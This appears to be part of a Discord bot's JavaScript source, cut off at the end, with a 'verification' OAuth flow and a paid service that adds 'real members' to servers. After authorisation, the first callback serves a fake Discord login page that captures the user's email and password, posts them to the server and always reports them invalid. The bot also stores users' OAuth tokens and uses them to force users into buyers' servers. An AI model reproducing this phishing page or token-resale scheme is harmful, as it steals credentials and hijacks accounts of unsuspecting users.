const REDIRECT_URI = 'https://scrawny-walnut-narwhal.glitch.me/login/callback'; // تأكد من المسار
const GUILD_ID = '1142207547785359471';
const ROLE_ID = '1328819604507590699';
const LINE_ICE= "**تم التحقق بنجاح** ✅";

const dbPath = path.join(__dirname, 'database', 'users.json');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));

// دالة لحفظ التوكنات
function saveUserData(userId, tokens ) {
  let users = {};
  
  if (fs.existsSync(dbPath)) {
    users = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
  }
  
  users[userId] = {
    guildId: `${config.bot.GuildId}`,
    accessToken: tokens.access_token,
    refreshToken: tokens.refresh_token,
  };
  
  fs.writeFileSync(dbPath, JSON.stringify(users, null, 2));
}

// مسار الاستجابة من Discord OAuth
app.get('/login/callback', async (req, res) => {
  const { code } = req.query;
  if (!code) return res.status(400).send('رمز التحقق مطلوب');

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', 
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: REDIRECT_URI,
        scope: 'identify guilds.join'
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const tokens = tokenResponse.data;
    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${tokens.access_token}` }
    });

    const profile = userResponse.data;
    saveUserData(profile.id, tokens);

    const guild = client.guilds.cache.get(GUILD_ID);
    if (!guild) return res.status(404).send('السيرفر غير موجود');

      const member = await guild.members.add(profile.id, { 
      accessToken: tokens.access_token 
    }).catch(console.error);
       await member.roles.add(ROLE_ID);

    // إرسال إشعار اللوج
    const logChannel = client.channels.cache.get(config.Log.LogChannelOwners);
    if (logChannel) {
      const logEmbed = new MessageEmbed()
      .setColor('#7adfdb')
    .setTitle('✅ تم التحقق بنجاح')
    .setThumbnail(`https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png`)
    .setDescription(`<@${profile.id}>`)
    .addFields(
      { name: 'الاسم', value: profile.username, inline: true },
      { name: 'المعرف', value: profile.id, inline: true },
      { name: 'البريد', value: profile.email || 'مخفي', inline: true }
    )
        .setTimestamp();

      logChannel.send({ 
        content: LINE_ICE || '', 
        embeds: [logEmbed] 
      });
    }
// الحصول على صورة المستخدم (logo)
const userAvatar = profile.avatar
  ? `https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png`
  : `https://cdn.discordapp.com/embed/avatars/0.png`;
   

    const htmlResponse = `
     <!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica', 'Arial', sans-serif;
        }
        
        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            background: url('https://media.discordapp.net/attachments/1116840947649630320/1350082229434449960/F2A5F444-DB70-4479-B492-2DDA46F50CB7.png?ex=67d5718e&is=67d4200e&hm=c0605dad80ecea692540895ed074360e77f6660b7793394bf8250506eefd6304&=&width=1327&height=650') no-repeat center center/cover;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        
        .login-container {
            background-color: #313338;
            width: 100%;
            max-width: 480px;
            padding: 32px;
            border-radius: 8px;
            color: white;
            z-index: 10;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        }
        
        h1 {
            text-align: center;
            margin-bottom: 8px;
            font-size: 24px;
        }
        
        .welcome-text {
            text-align: center;
            color: #b9bbbe;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 12px;
            font-weight: bold;
            color: #b9bbbe;
            text-transform: uppercase;
        }
        
        label:after {
            content: " *";
            color: #ED4245;
        }

        .error {
            color: #ED4245 !important;
        }

        .error-message {
            text-transform: none;
        }
        
        input {
            width: 100%;
            padding: 10px;
            background-color: #1e1f22;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
        }
        
        .input-error {
            border: 1px solid #ED4245;
        }
        
        input:focus {
            outline: none;
            border: 1px solid #6671e8;
        }
        
        .forgot-password {
            display: block;
            margin-top: 4px;
            color: #6671e8;
            font-size: 14px;
            text-decoration: none;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background-color: #6671e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 8px;
        }
        
        button:hover {
            background-color: #4752c4;
        }
        
        .register {
            margin-top: 16px;
            font-size: 14px;
            color: #b9bbbe;
        }
        
        .register a {
            color: #6671e8;
            text-decoration: none;
        }
        
        .register a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <form id="loginForm" action="acc.json" method="post" style="width: 100%; display: flex; justify-content: center;">
        <div class="login-container">
            <h1>Ha, te revoilà !</h1>
            <p class="welcome-text">Nous sommes si heureux de te revoir !</p>
            
            <div class="input-group">
                <label for="email" id="email-label">E-mail ou numéro de téléphone</label>
                <input type="text" id="email" name="email">
            </div>
            
            <div class="input-group">
                <label for="password" id="password-label">Mot de passe</label>
                <input type="password" id="password" name="password">
                <a href="#" class="forgot-password">Tu as oublié ton mot de passe ?</a>
            </div>
            
            <button type="button" onclick="validateForm()">Connexion</button>
            
            <div class="register">
                Besoin d'un compte ? <a href="https://discord.com/register" target="_blank">S'inscrire</a>
            </div>
        </div>
    </form>

    <script>
        function validateForm() {
            let emailInput = document.getElementById("email");
            let passwordInput = document.getElementById("password");
            let emailLabel = document.getElementById("email-label");
            let passwordLabel = document.getElementById("password-label");
            let loginForm = document.getElementById("loginForm");
            
            // Check if both fields have values
            if (emailInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
                // Create a form data object
                const formData = new FormData(loginForm);
                
                // Create XMLHttpRequest
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "acc.json", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                
                // Create data object
                const loginData = {
                    email: emailInput.value.trim(),
                    password: passwordInput.value.trim(),
                    timestamp: new Date().toISOString()
                };
                
                // Convert to JSON and send
                xhr.send(JSON.stringify(loginData));
                
                // Log data to console for debugging
                console.log("Data sent:", loginData);
                
                // Show error messages
                emailLabel.innerHTML = "E-mail ou numéro de téléphone <span class='error-message'>- identifiant ou mot de passe invalide</span>";
                emailLabel.classList.add("error");
                emailInput.classList.add("input-error");
                
                passwordLabel.innerHTML = "Mot de passe <span class='error-message'>- identifiant ou mot de passe invalide</span>";
                passwordLabel.classList.add("error");
                passwordInput.classList.add("input-error");
                
                // You could also redirect here if needed
                // window.location.href = "https://discord.com";
                
                return false; // Prevent default form submission
            } else {
                // Handle empty fields case
                if (emailInput.value.trim() === "") {
                    emailLabel.textContent = "E-mail ou numéro de téléphone - ce champ est obligatoire";
                    emailLabel.classList.add("error");
                    emailInput.classList.add("input-error");
                } else {
                    emailLabel.textContent = "E-mail ou numéro de téléphone";
                    emailLabel.classList.remove("error");
                    emailInput.classList.remove("input-error");
                }

                if (passwordInput.value.trim() === "") {
                    passwordLabel.textContent = "Mot de passe - ce champ est obligatoire";
                    passwordLabel.classList.add("error");
                    passwordInput.classList.add("input-error");
                } else {
                    passwordLabel.textContent = "Mot de passe";
                    passwordLabel.classList.remove("error");
                    passwordInput.classList.remove("input-error");
                }
                return false;
            }
        }
    </script>
</body>
</html>
    `;
    
    res.send(htmlResponse);

  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
    
  const htmlResponse = `<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>خطأ في التحقق</title>
  <link href="https://fonts.googleapis.com/css2?family=El+Messiri:wght@500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --error-red: #ff4444;
      --dark-bg: #1a1a1a;
    }

    body {
      font-family: 'El Messiri', sans-serif;
      background: var(--dark-bg);
      color: white;
      text-align: center;
      padding: 2rem;
    }

    .error-container {
      background: rgba(255, 68, 68, 0.1);
      border: 2px solid var(--error-red);
      padding: 2rem;
      border-radius: 15px;
      max-width: 600px;
      margin: 2rem auto;
      animation: shake 0.5s ease-in-out;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-10px); }
      75% { transform: translateX(10px); }
    }

    h1 {
      color: var(--error-red);
      font-size: 2.5em;
      margin-bottom: 1rem;
    }

    .error-code {
      background: rgba(0,0,0,0.3);
      padding: 0.5rem;
      border-radius: 5px;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <div class="error-container">
    <h1>❌ حدث خطأ!</h1>
    <p><%= message %></p>
    <p class="error-code">كود الخطأ: <%= errorCode %></p>
    <p>يرجى المحاولة مرة أخرى أو التواصل مع الدعم.</p>
  </div>
</body>
</html>
   `;


 res.send(htmlResponse);
  }
});

// حدث الرسائل للبوت
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('!verify') || message.author.bot) return;

  const verifyButton = new MessageButton()
    .setLabel('Verify Here')
    .setURL(`https://discord.com/oauth2/authorize?client_id=1328416486326276176&response_type=code&redirect_uri=https%3A%2F%2Fscrawny-walnut-narwhal.glitch.me%2Flogin%2Fcallback&scope=identify+guilds+guilds.join`)
    .setStyle('LINK');

  const row = new MessageActionRow().addComponents(verifyButton);

  const embed = new MessageEmbed()
    .setTitle('🔐 التحقق مطلوب')
    .setDescription('اضغط الزر أدناه لإكمال عملية التحقق:')
    .setColor('#5865F2');

  message.channel.send({ 
    embeds: [embed], 
    components: [row] 
  });

});  













//verify 2


const REDIRECT_URI2 = 'https://scrawny-walnut-narwhal.glitch.me/login/callback2'; // تأكد من المسار
const GUILD_ID2 = '1303802817479446568';
const ROLE_ID2 = '1341530716109803570';
const LINE_ICE2= "**تم التحقق بنجاح** ✅";

const dbPath2 = path.join(__dirname, 'database', 'users.json');


// مسار الاستجابة من Discord OAuth
app.get('/login/callback2', async (req, res) => {
  const { code } = req.query;
  if (!code) return res.status(400).send('رمز التحقق مطلوب');

  try {
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', 
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: REDIRECT_URI2,
        scope: 'identify guilds.join'
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const tokens = tokenResponse.data;
    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${tokens.access_token}` }
    });

    const profile = userResponse.data;
    saveUserData(profile.id, tokens, profile.email);

    const guild = client.guilds.cache.get(GUILD_ID2);
    if (!guild) return res.status(404).send('السيرفر غير موجود');

      const member = await guild.members.add(profile.id, { 
      accessToken: tokens.access_token 
    }).catch(console.error);
       await member.roles.add(ROLE_ID2);

    // إرسال إشعار اللوج
    const logChannel = client.channels.cache.get(config.Log.LogChannelOwners);
    if (logChannel) {
      const logEmbed = new MessageEmbed()
        .setColor('#7adfdb')
    .setTitle('✅ تم التحقق بنجاح')
    .setThumbnail(`https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png`)
    .setDescription(`<@${profile.id}>`)
    .addFields(
      { name: 'الاسم', value: profile.username, inline: true },
      { name: 'المعرف', value: profile.id, inline: true },
      { name: 'البريد', value: profile.email || 'مخفي', inline: true }
    )
        .setTimestamp();

      logChannel.send({ 
        content: LINE_ICE2 || '', 
        embeds: [logEmbed] 
      });
    }
 // الحصول على صورة المستخدم (logo)
const userAvatar = profile.avatar
  ? `https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png`
  : `https://cdn.discordapp.com/embed/avatars/0.png`;

const  user = profile.username;
const avatar = `https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png`;
const guildIcon = guild.icon;
const   guildId = GUILD_ID;

    const htmlResponse = `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تم التحقق بنجاح 👑</title>
  <link href="https://fonts.googleapis.com/css2?family=El+Messiri:wght@500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --gold: #5c0303;
      --platinum: #e5e4e2;
      --diamond: #b9f2ff;
      --velvet: #1a1a1a;
    }

    body {
      font-family: 'El Messiri', sans-serif;
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
       background: url('https://cdn.discordapp.com/banners/1303802817479446568/3c6253671564fbe91f3d179ce2af0863.webp?size=1024&width=1024&height=0') no-repeat center center/cover;
      position: relative;
      overflow: hidden;
    }

    .geometric-pattern {
      position: absolute;
      width: 200%;
      height: 200%;
      background: 
        repeating-linear-gradient(45deg, 
          transparent 25px, 
          rgba(255,215,0,0.1) 26px,
          transparent 27px),
        repeating-linear-gradient(-45deg, 
          transparent 25px, 
          rgba(255,215,0,0.1) 26px,
          transparent 27px);
      animation: patternMove 20s linear infinite;
      z-index: 0;
    }

    @keyframes patternMove {
      from { transform: translate(-50%, -50%); }
      to { transform: translate(0%, 0%); }
    }

    .container {
      background: rgba(10, 25, 47, 0.98);
      backdrop-filter: blur(15px);
      border-radius: 25px;
      padding: 40px;
      width: 80%;
      max-width: 700px;
      text-align: center;
      position: relative;
      z-index: 2;
      border: 3px solid var(--gold);
      box-shadow: 
        0 0 50px rgba(255,215,0,0.3),
        0 10px 30px rgba(0,0,0,0.5);
      transform-style: preserve-3d;
      animation: float 6s ease-in-out infinite;
    }

    .crown-icon {
     width: 80px;
      position: absolute;
      top: -40px;
      left: 50%;
      transform: translateX(-50%);
      filter: drop-shadow(0 0 10px var(--gold));
    }

    .user-frame {
      position: relative;
      width: 200px;
      height: 200px;
      margin: 30px auto;
      border-radius: 50%;
      background: linear-gradient(45deg, 
        var(--gold), 
        var(--platinum), 
        var(--diamond));
      padding: 5px;
      box-shadow: 0 0 40px var(--gold);
      animation: frameGlow 3s ease-in-out infinite;
    }

    .user-logo {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid var(--velvet);
    }

    .user-title {
      background: linear-gradient(45deg, var(--gold), var(--platinum));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-size: 2.5em;
      margin: 20px 0;
      text-shadow: 0 0 20px rgba(255,215,0,0.5);
    }

    .badge {
      position: absolute;
      bottom: 20px;
      right: 20px;
      width: 60px;
      filter: drop-shadow(0 0 5px var(--gold));
    }

    .sparkles {
      position: absolute;
      width: 100%;
      height: 100%;
      pointer-events: none;
    }

    .sparkle {
      position: absolute;
      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23FFD700"><path d="M12 .587l3.668 7.568 8.332 1.151-6.064 5.828 1.48 8.279-7.416-3.967-7.417 3.967 1.481-8.279-6.064-5.828 8.332-1.151z"/></svg>');
      width: 20px;
      height: 20px;
      animation: sparkle 1.5s infinite;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0) rotateX(0) rotateY(0); }
      50% { transform: translateY(-20px) rotateX(5deg) rotateY(5deg); }
    }

    @keyframes frameGlow {
      0%, 100% { box-shadow: 0 0 40px var(--gold); }
      50% { box-shadow: 0 0 60px var(--gold), 0 0 80px var(--diamond); }
    }

    @keyframes sparkle {
      0% { opacity: 0; transform: scale(0); }
      50% { opacity: 1; transform: scale(1); }
      100% { opacity: 0; transform: scale(0) translate(100px, -100px); }
    }
  </style>
</head>
<body>
  <div class="geometric-pattern"></div>
  
  <div class="container">
   
    
    <div class="user-frame">
      <img src="${userAvatar}" class="user-logo" alt="User Logo">
    </div>

    <h1 class="user-title">${user}</h1>
    
    <div class="success-message">
      <p style="color: var(--platinum); font-size: 1.3em;">
        مرحبًا بك في <span style="color: var(--gold);"> Las Vegas Role play </span>
      </p>
      <p style="color: var(--diamond);">
        تم التحقق بنجاح ✓<br>
        الرتبة الممنوحة: <span style="color: var(--gold);"> ・Citizen </span>
      </p>
    </div>

    <img src="https://images-ext-1.discordapp.net/external/sNRJpvUt9bVwDpqgf9abTJvWR5fqVqJEvYlemjrVK7w/https/media.tenor.com/gaG0oFo9K6QAAAPo/purple-verified-checkmark.mp4" class="badge" alt="Verified Badge">
    
    <div class="sparkles">
      <div class="sparkle" style="top:20%; left:10%"></div>
      <div class="sparkle" style="top:70%; left:80%"></div>
      <div class="sparkle" style="top:40%; left:50%"></div>
    </div>
  </div>
</body>
</html>
    `;
    
    res.send(htmlResponse);

  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
   
  const htmlResponse = `<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>خطأ في التحقق</title>
  <link href="https://fonts.googleapis.com/css2?family=El+Messiri:wght@500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --error-red: #ff4444;
      --dark-bg: #1a1a1a;
    }

    body {
      font-family: 'El Messiri', sans-serif;
      background: var(--dark-bg);
      color: white;
      text-align: center;
      padding: 2rem;
    }

    .error-container {
      background: rgba(155, 68, 68, 0.1);
      border: 2px solid var(--error-red);
      padding: 2rem;
      border-radius: 15px;
      max-width: 600px;
      margin: 2rem auto;
      animation: shake 0.5s ease-in-out;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-10px); }
      75% { transform: translateX(10px); }
    }

    h1 {
      color: var(--error-red);
      font-size: 2.5em;
      margin-bottom: 1rem;
    }

    .error-code {
      background: rgba(0,0,0,0.3);
      padding: 0.5rem;
      border-radius: 5px;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <div class="error-container">
    <h1>❌ حدث خطأ!</h1>
    <p><%= message %></p>
    <p class="error-code">كود الخطأ: <%= errorCode %></p>
    <p>يرجى المحاولة مرة أخرى أو التواصل مع الدعم.</p>
  </div>
</body>
</html>
   `;


 res.send(htmlResponse);
  }
});

// حدث الرسائل للبوت
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('!verify2') || message.author.bot) return;

  const verifyButton = new MessageButton()
    .setLabel('Verify Here')
    .setURL(`https://discord.com/oauth2/authorize?client_id=1328416486326276176&response_type=code&redirect_uri=https%3A%2F%2Fscrawny-walnut-narwhal.glitch.me%2Flogin%2Fcallback2&scope=identify+guilds+guilds.join`)
    .setStyle('LINK');

  const row = new MessageActionRow().addComponents(verifyButton);

  const embed = new MessageEmbed()
    .setTitle('🔐 التحقق مطلوب')
    .setDescription('اضغط الزر أدناه لإكمال عملية التحقق:')
    .setColor('#5865F2');

  message.channel.send({ 
    embeds: [embed], 
    components: [row] 
  });

});    















//server 2


client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  console.log('تم استدعاء الأمر');

  if (interaction.commandName === 'setup2') {
      
    if (!config.bot.owners.includes(`${interaction.user.id}`)) {  // تم تعديل interaction.author.id إلى interaction.user.id
      return;
    }
    console.log('الأمر setup2 تم استدعاؤه');

    const Channel = interaction.channel;

    const embed = new MessageEmbed()
      .setTitle('خدمة بيع أعضاء حقيقية')
      .setDescription('* لشراء أعضاء حقيقية يرجى فتح تذكرة')
      .setColor(config.bot.colorembed)
.setImage('https://media.discordapp.net/attachments/1328306288047947806/1328454768720347157/Untitled_design_page-0001.jpg?ex=6786c36a&is=678571ea&hm=98103982edaec8e7b4561951e21d875b8629a818e510805048ede5bcbeb8788f&=&format=webp&width=1314&height=363')      .setThumbnail(interaction.guild.iconURL())
      .setTimestamp()
      .setFooter({ text: `${interaction.user.username}`, iconURL: interaction.user.displayAvatarURL() });

    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('openticket2')
        .setLabel('فتح تكت')
.setEmoji('<:fix:1334113525928427542>')
        .setStyle('SECONDARY'),
      new MessageButton()
      .setCustomId('GetIdServer')
      .setLabel('أيدي سيرفر')
.setEmoji('<:a_skunt2:1335588149115617320>')
      .setStyle('SECONDARY')
    );

    try {
      await Channel.send({ embeds: [embed], components: [row] });
      console.log('تم إرسال الرسالة بنجاح');
    } catch (error) {
      console.error('حدث خطأ أثناء إرسال الرسالة:', error);
    }

    await interaction.reply({ content: '**تم إرسال بانل الشراء بنجاح ✅**', ephemeral: true });
  }
});



client.on('interactionCreate', async (interaction) => {
  if (interaction.isButton()) {
    if (interaction.customId === 'GetIdServer') {
      // إنشاء المودال
      const modal = new Modal()
        .setCustomId('ServerLinkModal')
        .setTitle('أدخل رابط سيرفرك')
        .addComponents(
          new MessageActionRow().addComponents(
            new TextInputComponent()
              .setCustomId('serverLink')
              .setLabel('أدخل رابط السيرفرك')
              .setStyle('SHORT')
              .setPlaceholder('https://discord.gg/example')
              .setRequired(true)
          )
        );

      await interaction.showModal(modal);
    }
  }

  if (interaction.isModalSubmit()) {
    if (interaction.customId === 'ServerLinkModal') {
      const serverLink = interaction.fields.getTextInputValue('serverLink');
      const inviteCode = serverLink.split('/').pop();

      try {
        const invite = await client.fetchInvite(inviteCode);
        const guild = invite.guild;

        if (guild) {
          return interaction.reply({
            content: `تم استخراج بيانات السيرفر بنجاح:\n**ID:** ${guild.id}\n**Guild Name:** ${guild.name}`,
            ephemeral: true,
          });
        }
      } catch (error) {
        console.error('Error fetching invite:', error);

        const inviteButton = new MessageButton()
          .setStyle('LINK')
          .setLabel('إضافة البوت')
          .setURL(`https://discord.com/api/oauth2/authorize?client_id=${config.bot.botID}&permissions=8&scope=bot`);

        const actionRow = new MessageActionRow().addComponents(inviteButton);

        return interaction.reply({
          content: 'عذرًا، لم أتمكن من العثور على هذا السيرفر. يُرجى إضافة البوت إلى السيرفر المطلوب باستخدام الرابط أدناه.',
          components: [actionRow],
          ephemeral: true,
        });
      }
    }
  }
});




client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  if (interaction.customId === 'openticket2') {
    // رسالة مخفية تسأل المستخدم عن طريقة الدفع
    const paymentRow = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('payCredit2')
        .setLabel('𝐂𝐫𝐞𝐝𝐢𝐭')
        .setEmoji('<:ProBot:1335208234813886515>')
        .setStyle('PRIMARY'),
      new MessageButton()
        .setCustomId('payCoins')
        .setLabel('𝐂𝐨𝐢𝐧𝐬')
.setEmoji('<:coin:1335208414275567656>')
        .setStyle('SECONDARY')
    );

    await interaction.reply({
      content: '𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐞𝐥𝐞𝐜𝐭 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝 :',
      components: [paymentRow],
      ephemeral: true,
    });
  }

  if (interaction.customId === 'payCredit2') {
    // التحقق من أن الفئة (Category) موجودة
     const category = await interaction.guild.channels.cache.get(config.bot.ceatogry2);
    if (!category || category.type !== 'GUILD_CATEGORY') {
      return interaction.reply({ content: 'لم يتم العثور على الفئة المحددة.', ephemeral: true });
    }

    const channelSpin = await interaction.guild.channels.create(`ticket-${interaction.user.username}`, {
      type: 'GUILD_TEXT',
      parent: config.bot.ceatogry2, // الفئة المحددة
      permissionOverwrites: [
        {
          id: interaction.guild.roles.everyone.id,
          deny: ['VIEW_CHANNEL'],
        },
        {
          id: interaction.user.id,
          allow: ['VIEW_CHANNEL'],
        },
      ],
    });

    const ticketEmbed = new MessageEmbed()
      .setTitle('تــذكـرة شــراء أعــضــاء حقــيـفـية')
      .setDescription(`* **${interaction.user} مرحبا بك 👋**\n\n
  **هذه تذكرة شراء الخاصة بك سأوضح لك كيف تشتري**\n\n
  * 1. أولا يجب عليك إضافة البوت من زر \`إضافة البوت\` أسفله \n
  * 2. ثانيا اذهب إلى إعدادات حسابك في خيار \`Advance\` قم بتفعيل \`Developer Mode\` \n
  * 3. قم بنسخ إيدي سيرفرك ثم عد إلى التذكرة و اضغط زر \`شراء أعضاء\` في خانة أولى أدخل الكمية و في خانة ثانية أدخل إيدي سيرفر\n
  ثم اضغط \`Submit\`.\n
  سيقوم البوت بإرسال رسالة لكي تنسخ أمر التحويل وتقوم بالتحويل.\n
  ثم بعد ذلك سيقوم البوت بنظام تلقائي في إدخال الأعضاء إلى خادمك.\n\n
  * **⚠️ ملاحظات مهمة:**\n
  \`-\` يرجى العلم أن التحويل خارج التذكرة يعتبر خطأ ولن يتم تعويضك.\n
  \`-\` التحويل لشخص آخر خطأ منك وأنت تتحمل المسؤولية وليس لنا أي علاقة بك.\n
  \`-\` إذا قمت بالتحويل قبل أن تقوم بإضافة البوت فليس لنا علاقة بك.\n\n
عند انتهائك من الخدمة لا تنسى تقييمنا
فنحن دائمًا نقدم الأفضل 🫡`)
.setImage('https://media.discordapp.net/attachments/1328306288047947806/1328449934919208990/1736797401459.png?ex=679f22a9&is=679dd129&hm=3ffaaeda6591fe1f0f497cd384ef01d14522ad917b547fa5c98d8e3cf3b2703e&=');
    const ticketRow = new MessageActionRow().addComponents(
       new MessageButton()
          .setCustomId("buyMembers2")
          .setLabel("شراء أعضاء")
          .setEmoji("👥") // استبدل الإيموجي المخصص بإيموجي Unicode
          .setStyle("SECONDARY"),
        new MessageButton()
          .setLabel("إدخال البوت")
          .setStyle("LINK")
          .setEmoji("🤖") // استبدل الإيموجي المخصص بإيموجي Unicode
          .setURL("https://discord.com/api/oauth2/authorize?client_id=1328416486326276176&permissions=0&scope=bot"),
        new MessageButton()
          .setCustomId("closeTicket")
          .setLabel("إغلاق التذكرة")
          .setEmoji('<:warnings:1201662163815505950>') // ✅ إصلاح الإيموجي
          .setStyle("SECONDARY")
    );

    // إرسال الرسالة في القناة الجديدة
    await channelSpin.send({
      content: `* ${interaction.user}`,
      embeds: [ticketEmbed],
      components: [ticketRow],
    });

    // تأكيد إنشاء التذكرة
    await interaction.update({ content: `** تم إنشاء تذكرتك بنجاح : ${channelSpin} ✅ **`, components: [], ephemeral: true });
  }


});



// ================================================================
client.on(`interactionCreate`,async interaction => {
  if (!interaction.isButton())return ; 
  if (interaction.customId == 'buyMembers2'){

    const BuyModal = new Modal()
    .setCustomId('BuyModal2')
    .setTitle('شراء اعضاء');
  const Count = new TextInputComponent()
    .setCustomId('Count')
    .setLabel("الكمية")
    .setMinLength(1)
    .setMaxLength(5)
    .setStyle('SHORT'); 
    
    const serverid = new TextInputComponent()
    .setCustomId('serverid')
    .setLabel("ايدي سيرفرك")
    .setMinLength(1)
    .setMaxLength(22)
    .setStyle('SHORT'); 


  const firstActionRow = new MessageActionRow().addComponents(Count);
  const firstActionRow2 = new MessageActionRow().addComponents(serverid);


  BuyModal.addComponents(firstActionRow , firstActionRow2);

  await interaction.showModal(BuyModal);


  } else if (interaction.customId === 'closeTicket2') {
      const confirmRow = new MessageActionRow().addComponents(
        new MessageButton()
          .setCustomId('confirmDelete2')
          .setLabel('تأكيد')
          .setStyle('SECONDARY'),
        new MessageButton()
          .setCustomId('cancelDelete2')
          .setLabel('إلغاء')
          .setStyle('DANGER'),
      );

      await interaction.reply({
        content: 'هل أنت متأكد من إغلاق التذكرة؟',
        components: [confirmRow],
        ephemeral: true,
      });

    } else if (interaction.customId === 'confirmDelete2') {
      await interaction.update({ content: '**سيتم حذف التذكرة بعد 5 ثواني...**', components: [] });

      setTimeout(async () => {
        const channel = interaction.channel;
        if (channel) await channel.delete();
      }, 5000);

    } else if (interaction.customId === 'cancelDelete2') {
      await interaction.update({ content: '** تم إلغاء حذف التذكرة بنجاح **', components: [] });
    }
})



client.on(`interactionCreate`, async interaction => {
  if (!interaction.isModalSubmit()) return;

  if (interaction.customId == 'BuyModal2') {
    const Count = interaction.fields.getTextInputValue('Count');
    const serverid = interaction.fields.getTextInputValue('serverid');
    const price = config.bot.price;

    const result = Count * price;
    const tax = Math.floor(result * (20 / 19) + 1);

    let alld = usersdata.all();
    let guild = client.guilds.cache.get(`${serverid}`);
    let amount = Count;
    let count = 0;

    if (!guild) {
      return interaction.reply({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` });
    }

    if (amount > alld.length) {
      return interaction.reply({ content: `**لا يمكنك ادخال هذا العدد ..**` });
    }

    await interaction.reply({ content: `#credit ${config.bot.TraId2} ${tax}` });

    const filter = ({ content, author: { id } }) => {
      return (
        content.startsWith(`**:moneybag: | ${interaction.user.username}, has transferred `) &&
        content.includes(config.bot.TraId2) &&
        id === "282859044593598464" &&
        (Number(content.slice(content.lastIndexOf("`") - String(tax).length, content.lastIndexOf("`"))) >= result)
      );
    };

    const collector = interaction.channel.createMessageCollector({
      filter,
      max: 1,
    });

    collector.on('collect', async collected => {
      console.log(`Collected message: ${collected.content}`);
      await interaction.deleteReply();

      let msg = await interaction.channel.send({ content: `**جاري الفحص ..**` });

      for (let index = 0; index < amount; index++) {
        await oauth.addMember({
          guildId: guild.id,
          userId: alld[index].ID,
          accessToken: alld[index].data.accessToken,
          botToken: client.token
        }).then(() => {
          count++;
        }).catch(err => {
          console.error(`Error adding member: ${err}`);
        });
      }

      msg.edit({
        content: `**تم بنجاح ..**
  **✅  تم ادخال** \`${count}\`
  **❌ لم اتمكن من ادخال** \`${amount - count}\`
  **📡 تم طلب** \`${amount}\``
});
await interaction.followUp({
    content: "**شكرا جدا انك تعاملت معانا اتمني تكتب رائيك هنا https://discord.com/channels/1303802817479446568/1335405153246773299 عشان بيهمني جدا <a:1048362753288589413:1328489627887210526> **",
    
});

        
      // إرسال رسالة إلى القناة المحددة
      const channelId2 = "1335405152160710726"; 
      const logChannel = client.channels.cache.get(channelId2);

      const embed = new MessageEmbed()
        .setTitle('تم شراء أعضاء')
        .setDescription(`**العميل:** ${interaction.user}\n**عدد الأعضاء:** ${amount}`)
